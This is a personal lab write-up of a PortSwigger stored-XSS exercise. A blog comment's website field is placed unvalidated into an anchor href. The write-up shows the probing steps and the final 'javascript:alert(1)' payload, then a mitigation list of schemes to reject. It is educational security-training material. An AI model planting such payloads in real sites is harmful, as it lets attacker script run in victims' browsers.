# Lab16 - Stored XSS Into Anchor href Attribute

## Objective

Exploit a Stored XSS vulnerability where user input is placed inside:

```html
<a href="">
```

attribute.

Execute:

```javascript
alert(1)
```

when the link is clicked.

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | Stored XSS |
| Difficulty | Apprentice |
| Context | href Attribute |
| Platform | PortSwigger |

---

# Vulnerability Overview

The website field in blog comments is inserted directly into:

```html
<a href="USER_INPUT">
```

without validation.

---

# Analysis

## Step 1

Open comment section.

---

## Step 2

Submit normal URL.

Example:

```text
https://google.com
```

---

## Step 3

Inspect comment.

Observed:

```html
<a href="https://google.com">
```

---

## Step 4

Determine Context

Input controls:

```html
href
```

directly.

---

# Full Payload(s) Used

## Probe

```text
https://google.com
```

---

## Final Payload

```javascript
javascript:alert(1)
```

---

# Why The Payload Works

Original:

```html
<a href="https://example.com">
```

---

Injected:

```html
<a href="javascript:alert(1)">
```

---

Execution Flow

```text
Victim Clicks Link
        ↓
javascript: URL
        ↓
alert(1)
```

---

# Personal Analysis & Testing Process

## Initial Goal

Determine how website field is rendered.

---

## Observation

Input becomes:

```html
href=""
```

value.

---

## Key Realization

Can control URL protocol.

---

## Exploitation Strategy

Replace:

```text
https://
```

with:

```javascript
javascript:
```

---

## Result

Clicking link executed:

```javascript
alert(1)
```

Lab solved.

---

# Mitigation

Allow only:

```text
http
https
```

Reject:

```text
javascript
data
vbscript
```

---

# Related Theory

- 24-xss-in-html-tag-attributes.md

---

# Key Learnings

- URL attributes are dangerous sinks.
- Protocol validation is essential.
- Stored XSS may require victim interaction.